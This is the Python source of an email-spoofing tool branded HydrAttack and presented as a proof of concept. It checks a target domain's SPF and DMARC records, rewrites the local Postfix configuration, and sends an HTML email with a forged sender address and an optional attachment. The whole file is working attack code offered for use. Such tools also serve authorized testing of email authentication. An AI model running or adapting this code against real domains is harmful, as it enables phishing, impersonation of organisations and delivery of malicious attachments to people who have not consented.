#!/usr/bin/python3
import sys
import os
import subprocess
import emailprotectionslib.dmarc as dmarc_lib
import emailprotectionslib.spf as spf_lib
import smtplib
import shutil
import time
import email_template as et
from colorama import Fore, Style

# Aliases
color_blue = Fore.BLUE
color_red = Fore.RED+Style.BRIGHT
color_green = Fore.GREEN+Style.BRIGHT
color_magenta = Fore.MAGENTA
color_reset = Style.RESET_ALL
color_bright = Style.BRIGHT

# Define the paths
postfix_source_main = "./postfix_main.cf"
postfix_destination_main = "/etc/postfix/main.cf"
postfix_source_generic = "./postfix_generic.cf"
postfix_destination_generic = "/etc/postfix/generic"
resolv_source = "/etc/resolv.conf"
resolv_destination = "/var/spool/postfix/etc/resolv.conf"

# HydrAttack banner
banner = f"""
{color_blue}  
  +++++                          +++++  
   ++++++++++++          ++++++++++++   
     +++++++++++++    +++++++++++++      
       ++++++++          ++++++++           HydrAttack{color_reset} PoC eMail Spoofer Module
{color_blue}        ++++++            ++++++          
          ++++            ++++              {color_reset}made by {color_blue}EASM HydrAttack{color_reset}, an innovative risk management platform
{color_blue}            ++            ++                {color_reset}designed {color_magenta}to help identify and mitigate web application risks in{color_reset}
{color_blue}             +            +                 {color_reset}{color_magenta}completely new ways{color_reset}
{color_blue}              +          +               
               +++    +++                
               ++++++++++                
                ++++++++                    {color_reset}{color_green}[web-site]{color_reset} https://hydrattack.com/
{color_blue}                ++++++++                    {color_reset}{color_green}[Xtwitter]{color_reset} https://twitter.com/EASM_HydrAttack
{color_blue}                 ++++++                     {color_reset}{color_green}[telegram]{color_reset} https://t.me/EASM_HydrAttack
{color_blue}                  ++++                      {color_reset}{color_green}[linkedin]{color_reset} https://www.linkedin.com/company/HydrAttack
{color_blue}                  ++++                  
                   ++                   
{color_reset}
"""

# Define the function to check if SPF record is strong
def is_spf_record_strong(domain):
    spf_record = spf_lib.SpfRecord.from_domain(domain)
    if spf_record and spf_record.record:
        return True
    return False

# Define the function to check if DMARC record is strong
def is_dmarc_record_strong(domain):
    dmarc = dmarc_lib.DmarcRecord.from_domain(domain)
    if dmarc and dmarc.record:
        return dmarc.policy in ["reject", "quarantine"]
    return False

# SPF output
def print_spf_record(domain):
    spf_record = spf_lib.SpfRecord.from_domain(domain)
    if spf_record and spf_record.record:
        print(f"{color_green}[+]{color_reset} Found SPF record:",str(spf_record.record))
    else:
        print(f"{color_red}[!]{color_reset} {domain} has no SPF record!")

# DMARC output
def print_dmarc_record(domain):
    dmarc = dmarc_lib.DmarcRecord.from_domain(domain)
    if dmarc and dmarc.record:
        print(f"{color_green}[+]{color_reset} Found DMARC record:", str(dmarc.record))
    else:
        print(f"{color_red}[!]{color_reset} {domain} has no DMARC record!")

# Final output
def check_spoofing_possible(domain):
    spf_record = spf_lib.SpfRecord.from_domain(domain)
    dmarc = dmarc_lib.DmarcRecord.from_domain(domain)

    # Check if SPF and DMARC records are present
    if not spf_record or not spf_record.record:
        return True
    
    if not dmarc or not dmarc.record:
        return True
    
    # Optionally, check if both records are strong (if needed for spoofing analysis)
    if not is_spf_record_strong(domain) or not is_dmarc_record_strong(domain):
        return True

    # No spoofing detected
    return False

# Setting postfix main.cf
def set_postfix_config():
    try:
        with open(postfix_source_main, "r") as file:
            content = file.read().replace("{{DOMAIN}}", domain)
            # Ensure the destination directory exists
        os.makedirs(os.path.dirname(postfix_destination_main), exist_ok=True)
        # Write the modified content to the destination
        with open(postfix_destination_main, "w") as file:
            file.write(content)
        print(f"{color_green}[+]{color_reset} Postfix configuration file changed")
    except subprocess.CalledProcessError as e:
        print(f"{color_red}[-]{color_reset} Postfix configuration file changing failed: {e}")

# Setting postfix generic
def set_postfix_generic():
    try:
        with open(postfix_source_generic, "r") as file:
            content = file.read().replace("{{DOMAIN}}", domain)
            # Ensure the destination directory exists
        os.makedirs(os.path.dirname(postfix_destination_generic), exist_ok=True)
        # Write the modified content to the destination
        with open(postfix_destination_generic, "w") as file:
            file.write(content)
        print(f"{color_green}[+]{color_reset} Postfix generic file changed")
    except subprocess.CalledProcessError as e:
        print(f"{color_red}[-]{color_reset} Postfix generic file changing failed: {e}")

# Sending spoofed email
def sending_email():
    # Adding necessary imports
    from email.mime.multipart import MIMEMultipart
    from email.mime.application import MIMEApplication
    from email.mime.text import MIMEText

    msg = MIMEMultipart()
    msg["Subject"] = et.msg_subject
    msg["From"] = et.msg_from
    msg["To"] = et.msg_to

    html_part = MIMEText(et.msg_body, "html")
    msg.attach(html_part)

    # Adding the attachement if it is
    if et.ATTACH:
        try:
            with open(et.ATTACH, "rb") as file:
                attachment = MIMEApplication(
                    file.read(),
                    Name=os.path.basename(et.ATTACH)
                )
            attachment['Content-Disposition'] = f'attachment; filename="{os.path.basename(et.ATTACH)}"'
            
            # Auto defining the MIME-type
            import mimetypes
            mime_type, _ = mimetypes.guess_type(et.ATTACH)
            if mime_type:
                attachment.add_header('Content-Type', mime_type)
            
            msg.attach(attachment)
            print(f"{color_green}[+]{color_reset} File attached: {et.ATTACH}")
        except FileNotFoundError:
            print(f"{color_red}[!]{color_reset} Attachment file not found: {et.ATTACH}")

    # Sending the email
    server = smtplib.SMTP("127.0.0.1", 25)
    server.sendmail(et.msg_from, et.msg_to, msg.as_string())
    server.quit()
    
    time.sleep(7)
    status_msg = "with attachment" if et.ATTACH else "without attachment"
    print(f"{color_green}[+] Spoofed email {status_msg} has been sent! Please check your mailbox.{color_reset}")
    print(f"{color_magenta}[!] If you have not received the email, change the address as it could have an antispam filter!{color_reset}")

# Launching
print(banner)

# Main app
if __name__ == "__main__":
    domain = sys.argv[1]

    print(f"{color_magenta}[*]{color_reset} Checking SPF records for {domain}:")
    print_spf_record(domain)
    print(f"{color_magenta}[*]{color_reset} Checking DMARC records for {domain}:" )
    print_dmarc_record(domain)
    if check_spoofing_possible(domain):
        print(f"{color_red}[+] Spoofing is possible for {domain}!{color_reset}\n")

        print(f"{color_magenta}[*]{color_reset} Start preparing the environment to send the spoofed eMail" )

        # Changing postfix configuration files
        set_postfix_config()
        set_postfix_generic()
        subprocess.run(["postmap", "/etc/postfix/generic"], check=True)

        # Update DNS server for postfix
        shutil.copy2(resolv_source, resolv_destination)

        # Start postfix
        try:
            subprocess.run(["postfix", "start"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"{color_green}[+]{color_reset} Starting the Postfix mail system")
        except:
            print(f"{color_red}[-]{color_reset} Postfix can't start")
        
        print(f"{color_magenta}[*]{color_reset} Sending spoofed email from {et.msg_from} to {et.msg_to}...")

        # Sending email
        sending_email()

    else:
        print(f"{color_green}[-] Spoofing is not possible for {domain}!{color_reset}")

print()
